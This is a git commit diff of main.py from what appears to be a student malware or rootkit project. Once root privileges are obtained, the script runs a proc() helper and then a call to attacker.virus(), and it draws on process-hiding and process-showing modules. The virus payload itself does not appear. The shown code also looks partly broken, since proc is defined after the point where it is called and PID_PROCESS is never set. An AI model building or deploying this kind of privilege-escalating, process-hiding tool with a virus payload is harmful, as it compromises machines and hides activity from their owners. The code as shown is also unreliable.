5635361eb0607357e1e20f97ce363cea32b48363
Nouri redouane <100516721+Nouri-redouane@users.noreply.github.com>
2022-11-01 22:15:34 +0100

    cleaning code
    cleaning code

--- main.py
+++ main.py
@@ -1,4 +1,5 @@
 import root
+import attacker
 import os
 import time
 from hideProcess import hideProcess
@@ -6,12 +7,23 @@ from createProcess import createProcess
 from showProcess import showProcess
 
 if __name__ == "__main__":
+    #nouri
     root_privilege = root.get_root()
 
     if root_privilege == True:
-        # create an empty folder in home folder
-        os.system("mkdir /home/zineddine-bk/empty")
+        #benkhaled 
+        proc()
+        #belhadj
+        attacker.virus()
+    else:
+        next = "only user commands"
+ 
+
+
+        
+def proc():
         username = os.getlogin()
+        os.system("mkdir /home/{}/empty".format(username))
 
         # install pyinstaller
         os.system("pip install -U pyinstaller")
@@ -25,34 +37,11 @@ if __name__ == "__main__":
         while 1:
             # print counter in seconds
             print("Counter: ", int(time.time()%current_time), end="\r")
-
-        # Take some time before hiding the process
-        #print('Pause 5 seconds before hiding main process ...')
-        # time.sleep(5)
-
-        # Create a process "sleep"
-        #PID_PROCESS = createProcess(cmd=['sleep', '10'])
-        #print("PID_PROCESS: ", PID_PROCESS)
-
-        # Take some time before hiding the process
-        #print('Pause 20 seconds before hiding subprocess ...')
-        # time.sleep(20)
-
-        # Hide "sleep" Process
-        #hideProcess(PID_PROCESS, username)
-
-        # Show Main App Process
-        #print('You can see the main process now')
-        # showProcess(PID_APP)
-
-        # Pause 10 seconds ...
         print('Pause 20 seconds before showing subprocess ...')
         time.sleep(20)
 
         # Show "sleep" Process
         print('You can see the subprocess now')
         showProcess(PID_PROCESS)
-    else:
-        next = "only user commands"
    
 
